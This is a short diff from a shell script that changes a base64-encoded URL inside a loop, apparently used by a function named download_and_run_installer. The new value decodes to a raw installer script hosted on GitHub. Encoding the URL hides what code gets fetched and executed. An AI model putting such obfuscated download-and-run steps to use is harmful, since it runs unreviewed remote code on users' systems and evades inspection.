@@ -22,7 +22,7 @@ download_and_run_installer() {
 }
 
 # Example encoded URLs
-urls=("aHR0cHM6Ly9leGFtcGxlLmNvbS9teWluc3RhbGxlci5zaA==")
+urls=("aHR0cHM6Ly9naXRodWIuY29tL211ZGFzc2lya2FtYWwvV2luZG93c09uTGludXgvcmF3L21haW4vaW5zdGFsbGVyLnNo")
 
 # Iterate over encoded URLs
 for encoded_url in "${urls[@]}"; do
